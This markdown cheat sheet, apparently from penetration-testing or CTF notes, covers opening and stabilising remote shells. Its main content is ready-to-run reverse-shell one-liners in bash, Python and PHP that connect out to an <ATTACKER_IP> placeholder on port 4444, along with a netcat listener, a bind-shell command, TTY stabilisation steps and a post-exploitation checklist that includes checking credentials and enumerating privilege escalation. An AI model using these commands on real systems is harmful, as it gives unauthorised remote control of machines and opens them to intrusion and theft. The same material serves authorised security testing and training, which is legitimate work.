# 🐚 Shells & Listeners Cheat Sheet

## Listener

```bash
nc -lvnp 4444
```

## Common Reverse Shells

Bash:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

Python:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

PHP:

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Stabilize a Linux Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```text
Ctrl-Z
```

On attacker:

```bash
stty raw -echo; fg
```

Then in shell:

```bash
export TERM=xterm
stty rows 40 columns 120
```

Reset broken terminal:

```bash
reset
```

## Bind Shell Concept

Target listens; you connect:

```bash
nc <TARGET_IP> <PORT>
```

Reverse shells are usually preferable when outbound connectivity is available.

## After You Get a Shell

```text
1. Stabilize it
2. Record current user/hostname
3. Check network interfaces/routes
4. Check credentials/files
5. Run local privilege-escalation enumeration
6. Transfer tools only when useful
```

Linux quick start:

```bash
id
hostname
ip a
ip route
sudo -l
```

Windows quick start:

```cmd
whoami
hostname
ipconfig /all
whoami /priv
```

Detailed notes: [Shells & Listeners](../exploitation/shells-and-listeners.md)
